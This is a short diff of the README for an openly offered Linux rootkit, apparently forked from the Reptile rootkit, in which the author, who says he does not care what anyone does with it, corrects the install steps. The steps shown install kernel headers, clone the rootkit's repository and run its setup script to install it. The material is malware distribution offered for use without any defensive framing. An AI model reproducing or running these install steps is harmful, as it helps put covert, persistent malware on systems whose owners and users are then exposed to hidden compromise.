@@ -25,11 +25,11 @@ I really don't give two shits what you do with this rootkit it's pretty shit lol
    
 #
 - Install (If you can't figure this out then you're a brain dead troglidyte)
-
+`
 apt-get install linux-headers-$(uname -r)
 git clone https://github.com/ret2win/siph0n-rootkit.git
-cd Reptile
-./setup.sh install
+cd siph0n-rootkit
+./setup.sh install `
 
 
 - Uninstall: 
